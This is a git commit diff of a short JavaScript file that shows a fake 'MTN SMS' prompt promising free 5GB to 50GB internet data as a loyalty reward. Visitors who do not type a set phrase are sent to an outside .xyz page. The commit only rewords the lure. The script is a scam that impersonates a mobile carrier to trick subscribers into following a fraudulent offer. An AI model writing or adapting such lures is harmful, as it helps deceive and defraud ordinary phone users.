57a284991ff7a59427cb21d6e39bd00e5d3b879a
okpoz <okpoitidz@gmail.com>
2026-07-03 09:03:31 +0100

    Update free-50gbdata-forall.js

--- free-50gbdata-forall.js
+++ free-50gbdata-forall.js
@@ -1,5 +1,5 @@
-var password = '50GB Free Data'
-password=prompt('SMS: MTN SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers ,Customers Reward, press Free Data To Check Now');
-if (password != '50GB Free Data') {
+var password = 'FREE DATA'
+password=prompt('MTN SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers ,Customers Reward, press Free Data To Check Now');
+if (password != 'FREE DATA') {
 location.href='https://okpoitid.xyz/free-50gbdata-forall.html';
 }
